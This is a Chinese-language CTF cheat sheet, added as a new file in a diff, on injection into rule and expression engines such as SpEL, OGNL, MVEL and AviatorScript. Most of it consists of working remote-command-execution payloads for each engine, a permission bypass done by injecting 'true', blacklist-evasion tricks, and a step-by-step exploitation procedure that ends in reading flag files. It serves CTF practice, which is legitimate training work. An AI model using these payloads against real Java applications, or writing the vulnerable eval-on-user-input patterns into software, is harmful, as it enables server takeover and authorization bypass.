@@ -1,0 +1,175 @@
+规则引擎注入漏洞（Rule Engine Injection）
+
+【0】核心认知：规则引擎注入本质
+
+一句话本质：
+
+攻击者可控制规则表达式，使服务器执行任意逻辑甚至代码执行。
+
+典型影响：
+
+权限绕过 表达式执行 远程命令执行 读取 flag
+
+【1】常见规则引擎类型
+
+高频 CTF 类型：
+
+SpEL（Spring Expression Language）
+
+OGNL
+
+MVEL
+
+AviatorScript
+
+QLExpress
+
+Drools
+
+典型调用方式：
+
+evaluate(rule)
+
+【2】漏洞产生原因
+
+危险代码：
+
+engine.execute(user_input)
+
+攻击者控制：
+
+rule 内容
+
+直接执行表达式
+
+【3】SpEL 注入示例
+
+payload：
+
+T(java.lang.Runtime).getRuntime().exec(“id”)
+
+实现命令执行
+
+读取 flag：
+
+T(java.lang.Runtime).getRuntime().exec(“cat /flag”)
+
+【4】OGNL 注入示例
+
+payload：
+
+@java.lang.Runtime@getRuntime().exec(“id”)
+
+实现 RCE
+
+【5】MVEL 注入示例
+
+payload：
+
+Runtime.getRuntime().exec(“id”)
+
+执行命令
+
+【6】AviatorScript 注入
+
+payload：
+
+import(‘os’).system(‘id’)
+
+实现执行
+
+【7】规则表达式绕过示例
+
+示例逻辑：
+
+if(user.role == “admin”)
+
+payload：
+
+true
+
+直接绕过权限验证
+
+【8】典型漏洞代码模式
+
+危险代码：
+
+engine.eval(request.getParameter(“rule”))
+
+攻击者控制：
+
+rule 参数
+
+直接执行表达式
+
+【9】CTF 标准利用流程（SOP）
+
+步骤1：定位规则执行点
+
+关键词：
+
+rule expression eval execute
+
+步骤2：测试表达式执行
+
+payload：
+
+1+1
+
+返回：
+
+2
+
+说明可执行表达式
+
+步骤3：测试命令执行
+
+payload：
+
+Runtime.getRuntime()
+
+确认可访问类
+
+步骤4：执行系统命令
+
+payload：
+
+Runtime.getRuntime().exec(“id”)
+
+步骤5：读取 flag
+
+cat /flag
+
+【10】常见绕过技巧
+
+绕过黑名单：
+
+字符串拼接
+
+示例：
+
+“ca”+“t /flag”
+
+Unicode 编码绕过
+
+大小写绕过
+
+【11】CTF 高频 flag 路径
+
+/flag /flag.txt /root/flag /app/flag
+
+备用：
+
+find / -name flag* 2>/dev/null
+
+【12】比赛速查 Checklist
+
+定位 rule 参数
+
+测试表达式执行
+
+测试 Runtime
+
+执行命令
+
+读取 flag
